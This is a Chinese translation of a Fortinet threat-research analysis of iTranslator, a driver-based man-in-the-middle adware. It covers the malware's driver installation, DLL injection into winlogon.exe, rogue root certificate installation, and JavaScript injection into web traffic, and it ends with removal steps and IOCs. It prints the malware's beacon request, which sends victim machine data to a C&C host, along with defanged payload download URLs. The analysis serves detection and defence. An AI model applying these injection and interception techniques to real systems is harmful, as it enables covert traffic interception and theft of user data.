> 原文链接: https://www.anquanke.com//post/id/160585 


# 深入分析基于驱动的MITM恶意软件：iTranslator


                                阅读量   
                                **135645**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：fortinet.com
                                <br>原文地址：[https://www.fortinet.com/blog/threat-research/deep-analysis-of-driver-based-mitm-malware-itranslator.html](https://www.fortinet.com/blog/threat-research/deep-analysis-of-driver-based-mitm-malware-itranslator.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t016d6dc907d4cd379a.jpg)](https://p5.ssl.qhimg.com/t016d6dc907d4cd379a.jpg)

## 一、前言

FortiGuard实验室研究团队最近捕获到一个恶意软件样本，这个EXE文件带有一个无效的证书签名。一旦受害者打开exe文件，恶意软件就会安装两个驱动，控制受害者的Windows系统，同时监控受害者使用浏览器的互联网活动规律。

在本文中，我将详细分析恶意软件如何在受害者系统上安装驱动、驱动的工作方式以及恶意软件的具体功能。



## 二、执行恶意软件样本

本次捕获的样本文件名为`itranslator_02.exe`。在实际攻击活动中，恶意软件使用了多个不同的名称，包括`itransppa.exe`、`itranslator20041_se.exe`、`Setup.exe`以及`itransVes.exe`。样本文件经过证书签名，证书的过期时间为2015年5月16日。该证书由`VeriSign Class 3 Code Signing 2010 CA`颁发给`Beijing ******** Technology Ltd`（这里我隐去了公司的名称），序列号为`0A 00 5D 2E 2B CD 41 37 16 82 17 D8 C7 27 74 7C`。样本的数字证书信息如图1所示：

[![](https://p0.ssl.qhimg.com/t01c0525d269b8f053d.png)](https://p0.ssl.qhimg.com/t01c0525d269b8f053d.png)

图1. 恶意软件使用了已过期的证书

当`itranslator_02.exe`运行时，会在`program-data`目录（在我的测试环境中，该目录为`C:\ProgramData`）中创建名为`itranslator`的一个新目录，然后将名为`wintrans.exe`的一个新文件释放到该目录中。使用参数`P002`启动`wintrans.exe`后，`itranslator_02.exe`的任务就此完成。这里使用的命令行字符串为：`C:\ProgramData\itranslator\wintrans.exe P002`，恶意软件将`P002`作为`GUID`来使用，并在恶意攻击活动中利用该值与C&amp;C服务器通信。



## 三、安装驱动组件

顺利接管`itranslator_02.exe`的工作后，`wintrans.exe`会下载其他恶意组件并安装到受害者的Windows系统中，然后在受害者系统上安装驱动，我们来看驱动安装过程。

[![](https://p2.ssl.qhimg.com/t013e5b06eb8f5101b6.png)](https://p2.ssl.qhimg.com/t013e5b06eb8f5101b6.png)

图2. 创建驱动服务“iTranslatorSvc”

恶意软件创建了一个线程来执行该操作：首先调用两个Windows系统API来创建驱动服务，相关API为`OpenSCManagerA`以及`CreateServiceA`。驱动名为`iTranslatorSvc`，该名称为`CreateServiceA` API的一个参数。

利用这种方式，恶意软件调用`CreateServiceA` API为新的驱动服务创建一个新的注册表键值。该样本创建的注册表键值为：`HKLM\SYSTEM\CurrentControlSet\services\iTranslatorSvc`。

新创建驱动的启动（`Start`）类型最开始时会被恶意软件设置为2（对应的就是`AUTO_START`），随后再被修改为1（对应的是`SYSTEM_START`）。这样每当系统启动时都会启用该驱动。我们通过IDA Pro分析了驱动的创建过程，如图2所示。

接下来，`wintrans.exe`会将名为`iTranslator`的一个文件释放到`Windows`目录中（在我的测试环境中该目录为`C:\Windows\`），该文件已事先内嵌在`wintrans.exe`文件的`BIN`资源区中。释放文件的伪代码如图3所示。

[![](https://p0.ssl.qhimg.com/t01b29e9120b67ba6c2.png)](https://p0.ssl.qhimg.com/t01b29e9120b67ba6c2.png)

图3. 从资源区中提取iTranslator文件

大家可能已经猜到，`iTranslator`也是一个Windows驱动文件，调用`CreateServiceA`时使用了该文件的完整路径以便创建`iTranslatorSvc`。

`iTranslator`文件经过VMProtect加壳保护，该文件同样带有一个无效的证书签名（证书已于2015年5月12日过期）。签名方为`Nanjing ********* Technology Co.,Ltd`，序列号为`73 dc b1 a0 35 15 bb 63 9b f3 1e cd 5f 98 ff 24`。`iTranslator`文件的属性信息如图4所示，我们也使用PE工具分析了加壳信息。

[![](https://p0.ssl.qhimg.com/t01055cf5baab926d05.png)](https://p0.ssl.qhimg.com/t01055cf5baab926d05.png)

图4. `iTranslator`属性及加壳信息

随后恶意软件使用`P002`创建GUID值，并且使用受害者的硬件信息生成十六进制值来创建`MachineCode`键，这些值都保存在`HKLM\SYSTEM\CurrentControlSet\services\iTranslatorSvc`这个子键中。注册表中的相关数据如图5所示：

[![](https://p4.ssl.qhimg.com/t01b7342cc1a65d4347.png)](https://p4.ssl.qhimg.com/t01b7342cc1a65d4347.png)

图5. iTranslatorSvc注册表信息

此后，恶意软件继续调用`StartServiceA`，立刻运行恶意驱动。为了向大家展示恶意驱动程序在受害者计算机上的运行过程，接下来我会以操作系统启动为起点，从头开始梳理整个过程，这也是加载驱动的正常方式。



## 四、下载其他组件

一旦安装完毕，恶意软件会在某个线程函数中尝试下载一个DLL模块。相应的HTTP请求及响应数据如图6所示：

[![](https://p0.ssl.qhimg.com/t013df22af2b478e7de.png)](https://p0.ssl.qhimg.com/t013df22af2b478e7de.png)

图6. 下载DLL文件

在URI中，`uid=`为机器代码，`v=`为恶意软件当前版本（这里的版本为`1.0.0`），`x=`为受害者的Windows架构（32位或者64位）。在头部数据中，`UID: P002`为恶意软件的GUID。在响应报文中，恶意软件会返回最新的版本信息以及下载链接。在本文样本中，最新的版本为`1.0.7`版，下载链接为`hxxp://gl.immereeako.info/files/upgrade/32/iTranslator.dll`（然而在分析该恶意软件的过程中，最新版本更新到了`1.0.8`版，下载链接也变为`hxxp://dl.shalleeatt.info/ufiles/32x/iTranslator.dll`）。

恶意软件随后会下载DLL文件，将其保存为同一个目录（即`C:\ProgramData\itranslator\`）下的`wintrans.exe`。根据我的分析，下载的文件`iTranslator.dll`可能是这款恶意软件的主模块，其执行的部分任务列表如下：

1、提取并加载一个网络过滤器驱动；

2、与其他驱动交换数据；

3、在未经受害者许可的情况下，将SSL证书以可信根证书形式安装到浏览器中；

4、监控受害者浏览器的互联网访问数据包。

有趣的是，下载的文件并不仅仅是一个DLL文件，而是一个文件容器，其资源区中包含许多其他文件，这些文件随后会释放到受害者的本地目录中。下载的`iTranslator.dll`可以在首次安装时由`wintrans.exe`加载运行，也可以在Windows系统启动时由`winlogon.exe`负责加载及运行，而后者由`iTranslatorSvc`驱动负责加载。我会在下文的驱动启动部分详细介绍这个过程。

恶意软件同时也会在系统注册表的`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion`路径中记录最新的版本信息，其中`iVersion`代表最新版本号，本文成稿时该版本号为`1.0.8`。



## 五、通知攻击者

`wintrans.exe`的最后一个任务是将受害者的系统信息发送到攻击者的服务器，发送的报文格式如下所示：

```
GET /in.php?type=is&amp;ch=P002&amp;mc=07********************93&amp;os=Windows7(6.1)&amp;t=1435127837&amp;m=08****0****E HTTP/1.1

UID: P002

MC: 078********************3

User-Agent: ITRANSLATOR

Host: tk.immereeako.info
```

URL中的`ch=`以及头部中的`UID`为GUID `P002`；URL中的`mc=`以及头部中的`MC`为受害者系统的机器码；`os=`为受害者的操作系统版本；`t=`为当前Windows的安装日期，该信息来自于系统注册表中，恶意软件使用了Unix格式时间，即从1970年1月1日以来的秒数；`m`为受害者的网络MAC地址。

我将原始报文中的敏感信息以`*`号来代替，该报文用来通知攻击者恶意软件已在Windows系统上安装完毕。



## 六、在Windows启动过程中加载恶意驱动

Windows系统启动过程中会加载`iTranslatorSvc`驱动，从现在开始我会详细介绍恶意软件的工作流程。

恶意驱动文件路径为`C:\Windows\iTranslator`，经过VMProtect v2.0.7加壳保护，存在多个导出函数，如图7所示。

[![](https://p1.ssl.qhimg.com/t01b47f81b5d726c371.png)](https://p1.ssl.qhimg.com/t01b47f81b5d726c371.png)

图7. iTranslatorSvc驱动的导出函数

该驱动由`nt!IopLoadDriver`负责加载。当VMProtect加壳器的代码执行后，会还原出驱动的`DriverEntry`函数，我们可以进入该函数继续分析。

驱动首先会从系统的注册表中读取`GUID`以及`MachineCode`，将这些信息保存在全局变量中，然后将`Start`值设置为1，即`SYSTEM_START`。接下来恶意软件会为该驱动创建一个设备对象`\\Device\\iTranslatorCtrl`以及一个符号链接`\\DosDevices\\iTranlatorCtrl`，这样运行在ring 3的恶意软件就可以通过`\\\\.\\iTranslatorCtrl`访问驱动。随后恶意驱动会设置一些dispatch（分发）函数，就像其他驱动一样。在`IRP_MJ_DEVICE_CONTROL`分发函数中，驱动只会返回来自于全局变量的`GUID`以及`MachineCode`值。



## 七、在系统线程中设置回调函数

最后，恶意驱动会调用`nt!PsCreateSystemThread` API创建一个系统线程，线程函数同样经过VMProtect加壳器的保护。受VMProtect保护的系统线程函数代码片段如图8所示。恶意驱动中的所有API调用都通过这种方式经过加壳保护，如图8所示：

[![](https://p1.ssl.qhimg.com/t01c42b81fd48cbbc51.png)](https://p1.ssl.qhimg.com/t01c42b81fd48cbbc51.png)

图8. 经过VMProtect加壳保护的代码片段

系统线程启动时首先会从内存中释放文件，文件的完整路径为`C:\Windows\System32\iTranslator.dll`，然后调用`nt!PsSetLoadImageNotifyRoutine` API来设置镜像加载回调函数。MSDN对该API的描述为：“`PsSetLoadImageNotifyRoutine`例程用来注册由驱动提供的一个回调函数，以便当镜像加载（或映射到内存中）时获得相关通知”。这意味着每当镜像（或者EXE文件）开始加载时，镜像就会被挂起，驱动中的回调函数就会被另一个API（即`nt!PsCallImageNotifyRoutines`）所调用。此时，`iTranslatorSvc`驱动就可以读取镜像的整个进程信息，通过修改进程信息来影响进程的执行流程。

让我们回到驱动中的这个回调函数上，分析该函数的具体功能。当该函数被调用时，会检查进程名是否为`winlogon.exe`，如果满足该条件，则驱动就会找到该进程的映射内存，然后在内存中重建[Import Directory Table](https://docs.microsoft.com/en-us/windows/desktop/debug/pe-format#import-directory-table)（IDT表），将恶意DLL `C:\Windows\System32\iTranslator.dll`加到该表末尾处。IDT表中同样包含该进程所需的某些模块数据（比如`Kernel32.dll`、`User32.dll`）。IDT表中每个模块的数据占用14H个字节。

重建的IDT表如图9所示，恶意软件需要修改导入表（Import Table）表项在PE数据目录表（Data Directory Table）中的偏移来重建IDT表。随后，一旦`winlogon.exe`恢复执行，就会像加载其他正常DLL那样加载这个恶意的DLL。

[![](https://p1.ssl.qhimg.com/t01171be5eb62e13388.png)](https://p1.ssl.qhimg.com/t01171be5eb62e13388.png)

图9. 重建IDT表

为什么恶意软件使用的是`winlogon.exe`？这是属于Windows登录管理器的一个进程，可以处理登录及注销过程。如果该进程被终止，则用户会从系统中注销。换句话说，除非Windows系统关闭，否则该进程将始终处于运行状态。

恶意驱动还会继续设置另一个镜像加载回调函数。根据我的分析，该函数用来检查镜像是否为特定的浏览器，如`iexplore.exe`、`firefox.exe`或者`chrome.exe`。如果匹配成功，驱动就会查找相关的进程信息块，向其命令行中添加`hxxp://go.microsoft.com/?69157`参数。完成该操作后，当浏览器启动时就会先访问`hxxp://go.microsoft.com/?69157`这个网址。IE启动时情况如图10所示，其命令行末尾已附加了`hxxp://go.microsoft.com/?69157`这个URL。

[![](https://p1.ssl.qhimg.com/t01ca82a23c55212fbc.png)](https://p1.ssl.qhimg.com/t01ca82a23c55212fbc.png)

图10. IE使用`hxxp://go.microsoft.com/?69157`参数

实际上，受害者的浏览器并没有真正访问过该URL，该URL的作用更像是一个开关标志。随后，恶意软件会提取并加载另一个驱动来监控受害者的网络活动，然后中断请求，指向`hxxp://go.microsoft.com/?69157`，然后执行不同的任务。下文我们将分析这方面内容。

恶意驱动同样会在系统线程函数中调用[`nt! CmRegisterCallback`](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-cmregistercallback)来设置注册表回调函数，在驱动级别过滤注册表调用。根据我的分析，这个回调函数对微软Edge浏览器比较关注。

`iTranslatorSvc`驱动同样会保护系统注册表中相关路径（即`HKLM\SYSTEM\CurrentControlSet\services\iTranslatorSvc`）的访问权限。当我们使用注册表编辑器访问该路径时，会看到一个错误提示消息，如图11所示。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t011eccf140351f9458.png)

图11. 受驱动保护的iTranslatorSvc注册表项



## 八、当winlogon.exe恢复运行

前面我提到过，当`winlogon.exe`恢复运行时，会加载`C:\Windows\System32\iTranslator.dll`，该文件来自于`iTranslatorSvc`驱动，整个过程如前文所述。`System32`目录下的`iTranslator.dll`同样经过VMProtect v.2.07加壳保护。

根据我的分析，该程序的主要目的是加载`C:\ProgramData\itranslator`目录中的`itranslator.dll`模块（该文件由前文提到过的`wintrans.exe`下载）。随后，如果C&amp;C服务器上存在更新版本的`itranslator.dll`，则恶意软件会尝试更新，这与`wintrans.exe`的功能类似。到目前为止，该DLL文件的最新版本为`1.0.8`。

恶意软件的文件名可能会让大家有点困惑，这里存在两个相似的文件名。一个来自于`iTranslatorSvc`驱动，路径为`C:\Windows\System32\iTranslator.dll`，另一个从C&amp;C服务器下载，路径为`C:\ProgramData\itranslator\itranslator.dll`。在下文中，为了区分这两个文件，我将`C:\Windows\System32\iTranslator.dll`标记为`extracted-iTranslator.dll`，将`C:\ProgramData\itranslator\itranslator.dll`标记为`downloaded-itranslator.dll`。

`downloaded-itranslator.dll`为该恶意软件的主模块，可以由`wintrans.exe`以及`winlogon.exe`加载执行。在`winlogon.exe`进程中，`downloaded-itranslator.dll`会被手动加载到`0x10000000`这个内存位置。根据该文件PE结构中的数据定义，该进程会矫正数据以便正常执行。最后，进程会调用`downloaded-itranslator.dll`的入口函数。至此`extracted-iTranslator.dll`的任务已圆满完成。



## 九、启动downloaded-itranslator.dll

恶意软件首先通过`iTranslatorSvc`驱动获取`GUID`以及`MachineCode`的值，并将其保存到全局变量中。在下一步中，恶意软件会创建一个线程，从C&amp;C服务器获取C&amp;C服务器URL的更新列表。通过这种方法，这款恶意软件可以使用多个不同的C&amp;C服务器啦执行不同的任务。`hxxp://ask.excedese.xyz/`这个服务器保存了两个C&amp;C服务器URL，对应的报文内容如图12所示。

[![](https://p0.ssl.qhimg.com/t01267a58da0c43e48f.png)](https://p0.ssl.qhimg.com/t01267a58da0c43e48f.png)

图12. 更新C&amp;C服务器URL

响应报文中包含JSON格式的两个新的URL，分别为`immereeako.info`以及`search.bulletiz.info`，这些地址会保存到两个全局变量中，以便后续使用。

前面我提到过，`downloaded-itranslator.dll`文件其实是一个容器，其资源区中包含许多文件，这些文件会被释放到本地不同的目录中，这些文件如下表所示：

[![](https://p4.ssl.qhimg.com/t012e67ca973c5ca991.png)](https://p4.ssl.qhimg.com/t012e67ca973c5ca991.png)

此外，恶意软件也会从内存中释放出`C:\Windows\SSL\Sample CA 2.cer`这个文件。



## 十、中间人攻击

根据我的分析，释放出来的所有文件都用于在受害者系统上执行[中间人攻击](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)。

`iNetfilterSvc`文件是另一个驱动程序，其名称为`NetfilterSvc`，其实是[NetFilter SDK](http://netfiltersdk.com/index.html)这个商业项目的一个实例。该驱动是一个框架。用来透明过滤Windows系统中通过网络传输的数据包。释放出来的`Sample CA 2.cer`是一个根证书，会以可信根证书颁发机构形式安装到Firefox以及Windows系统中（针对IE和Chrome）。这对隐蔽执行中间人攻击是非常有必要的一个操作。通过这种方法，受害者浏览器中用于SSL保护通信的所有证书其实都由`Sample CA 2.cer`签发，由于`Sample CA 2.cer`已经位于可信根证书颁发机构列表中，因此浏览器不会向用户告警。

攻击者会使用`C:\Windows\nss`中的所有文件来控制Firefox浏览器。`C:\Windows\nss\certutil.exe`文件用来将`Sample CA 2.cer`安装到Firefox中。使用调试器来分析`certutil.exe`时如图13所示。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t010ce46917d311da1f.png)

图13. `certutil.exe`安装`Sample CA 2.cer`

在图14中，我们可以看到`Sample CA 2.cer`已安装到Mozilla Firefox以及Microsoft IE的可信根证书颁发机构列表中。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t019f09b5e1cc4e88ac.png)

图14. Sample CA 2.cer安装到Mozilla Firefox以及Microsoft IE中

`downloaded-itranslator.dll`模块的主要功能是释放`iNetfilterSvc`模块，运行该模块（顺便提一句，`C:\Windows\iNetfilterSvc`在加载后会被立刻删除），安装`Sample CA 2.cer`，然后与`iTranslatorSvc`及`NetfilterSvc`这两个驱动通信。通过这种方法，恶意软件可以监控受害者在所有主流浏览器上的活动。

恶意软件继续创建`NetfilterSvc`驱动的一个驱动句柄（`\\.\CtrlSMNetfilterSvc`），以便与该驱动交换数据，然后将相关协议注册到`NetfilterSvc`，这样当捕获相关协议的数据时，驱动就可以调用回调函数。大家可以访问[Netfilter SDK](http://netfiltersdk.com/index.html)的官方网站，了解详细信息。从图15中，我们可以看到恶意软件注册HTTP协议（80端口）以及HTTPS协议（443端口）的代码片段。

[![](https://p3.ssl.qhimg.com/t017219aaea8c251424.png)](https://p3.ssl.qhimg.com/t017219aaea8c251424.png)

图15. 注册待过滤的协议到NetfilterSvc

[![](https://p4.ssl.qhimg.com/t01816e72ae95ad633e.png)](https://p4.ssl.qhimg.com/t01816e72ae95ad633e.png)

图16. 协议回调函数代码片段

大家是否还记得，当受害者启动IE时，`iTranslatorSvc`中的镜像加载回调函数就会被调用，随后就会将`hxxp://go.microsoft.com/?69157`附加到IE的命令行参数中。IE发送HTTP请求报文，该报文会被`NetfilterSvc`驱动捕获。与此同时，`downloaded-itranslator.dll`中的协议回调函数就会被调用。一个回调函数的代码片段如图16所示，恶意软件会检查所请求的URL是否为`hxxp://go.microsoft.com/?69157`，如果满足该条件，则发送一个通知报文到C&amp;C服务器，然后受害者已打开浏览器。

使用Fiddler捕捉到的通知报文如图17所示。请求的URL中包含`P002`以及`MachineCode`。C&amp;C服务器返回的数据中包含`Location: hxxps://www.google.com`信息，该信息最终会发送回IE，而IE会向受害者显示Google网站。因此，受害者系统其实不会真正去访问`hxxp://go.microsoft.com/?69157`这个URL。

[![](https://p5.ssl.qhimg.com/t0190b6e73d5bb2b8d4.png)](https://p5.ssl.qhimg.com/t0190b6e73d5bb2b8d4.png)

图17. 通知C&amp;C服务器浏览器已打开

对于浏览器中的其他请求（包括HTTP以及HTTPS数据），恶意软件可以通过中间人攻击方法修改数据包的内容。恶意软件会在每个响应数据包的末尾插入一小段JavaScript代码。这段JavaScript代码在早期流程中生成，包含C&amp;C服务器URL以及`MachineCode`。当浏览器收到响应数据时，就会执行已插入的JavaScript代码，执行更多恶意操作。到目前为止，这段JavaScript代码只会从C&amp;C服务器上下载其他JS文件。被修改过的`hxxps://www.google.com`页面源码如图18所示，尾部包含已插入的JavaScript代码。

[![](https://p5.ssl.qhimg.com/t01d6abcd13343fd7c5.png)](https://p5.ssl.qhimg.com/t01d6abcd13343fd7c5.png)

图18. 插入google.com响应报文的JavaScript代码

大家可能会注意到，当JavaScript代码运行时，会从`hxxps://cdn.immereeako.info/pa.min.js`处下载一个脚本并在受害者的浏览器中运行。

不幸的是，我的测试主机并没有安装微软的Edge浏览器，但我认为恶意软件的攻击方法同样适用于Edge浏览器。



## 十一、JavaScript代码分析

当受害者浏览器加载`hxxps://cdn.immereeako.info/pa.min.js`时，就会往C&amp;C服务器发送一个HTTP请求，如下图所示：

[![](https://p5.ssl.qhimg.com/t0161323e6e82648a34.png)](https://p5.ssl.qhimg.com/t0161323e6e82648a34.png)

请求报文中包含`MachineCode`以及从受害者浏览器中收集到的一些数据（比如受害者正在访问的当前URL地址，本次测试中该地址为`hxxps://www.facebook.com`）。

URL中的`pacb_jlcmurby4cp95`是一个带有随机名的回调函数，该函数由`pa.min.js`负责生成。C&amp;C服务器端会在响应报文中用到该名称。某个响应报文如下图所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01409e968269ad4f1c.png)

body中的红色高亮部分为JavaScript代码，其中使用了对象参数来调用`pacb_jlcmurby4cp95`函数。在回调函数中，脚本会处理该参数，在当前页面上添加鼠标单击事件（例如：`hxxp://www.facebook.com`）。当鼠标单击事件在受害者当前访问的页面中触发时，脚本会创建一个新的标签页，然后访问响应数据包中的URL（这里的URL为`hxxp://www.onclickbright.com/jump/next.php?r=20*****&amp;sub1=pa`，我用`*`号隐去了一些信息）。根据我的研究，访问该URL会让受害者看到一个广告页面。受害者在Microsoft IE及Google Chrome浏览器中看到的广告页面如图19所示。

[![](https://p2.ssl.qhimg.com/t01ce47787c30d696b1.png)](https://p2.ssl.qhimg.com/t01ce47787c30d696b1.png)

图19. 推送给受害者的多个广告页面



## 十二、感染流程

为了更好地理解这款恶意软件的整体感染流程，我梳理了一个简单的流程图，如图20所示。

[![](https://p2.ssl.qhimg.com/t016b533caff44fa9fa.png)](https://p2.ssl.qhimg.com/t016b533caff44fa9fa.png)

图20. 简要版感染流程图



## 十三、解决方案

FortiGuard反病毒服务已经公布了检测该样本的特征：**W32/Itranslator.FE45!tr**，此外，FortiGuard Webfilter服务已经将相关URL标识为“**恶意网站**”。

如果想删除这款恶意软件，可以重启主机并进入按全模式，然后执行如下操作：

1、删除`%WINDIR%\iTranslator`文件；

2、删除`%WINDIR%\nss`以及`%WINDIR%\SSL`目录；

3、删除`%WINDIR%\system32\iTranslator.dll`文件；

4、删除`%ProgramData%\itranslator`目录；

5、删除`HKLM\SYSTEM\CurrentControlSet\services\iTranslatorSvc`注册表键值；

6、删除`HKLM\SYSTEM\CurrentControlSet\services\NetfilterSvc`注册表键值；

7、删除所有浏览器中的`Sample CA 2`证书。



## 十四、IOC

**URL**

```
hxxp://s3.amazonaws.com/dl.itranslator.info/
hxxps://cdn.immereeako.info/pa.min.js
hxxp://tk.immereeako.info/in.php
hxxp://ask.excedese.xyz/i.php
hxxp://gl.immereeako.info/files/upgrade/32/iTranslator.dll
hxxp://dl.shalleeatt.info/ufiles/32x/iTranslator.dll
```

**样本SHA-256哈希**

```
itranslator_02.exe
B73D436D7741F50D29764367CBECC4EE67412230FF0D66B7D1D0E4D26983824D

wintrans.exe
67B45AE63C4E995D3B26FE7E61554AD1A1537EEEE09AAB9409D5894C74C87D03

iTranslator（驱动）
E2BD952812DB5A6BBC330CC5C9438FC57637760066B9012FC06A8E591A1667F3

downloaded-itranslator.dll（1.0.7版）
C4EDE5E84043AB1432319D74D7A0713225D276600220D0ED5AAEB0B4B7CE36CD

downloaded-itranslator.dll（1.0.8版）
873825400FFF2B398ABF397F5A913A45FBD181654F20FBBE7665C239B7A2E8F5
```



## 十五、参考资料

NetFilter SDK：[http://netfiltersdk.com/index.html](http://netfiltersdk.com/index.html)

中间人攻击：[https://en.wikipedia.org/wiki/Man-in-the-middle_attack](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)
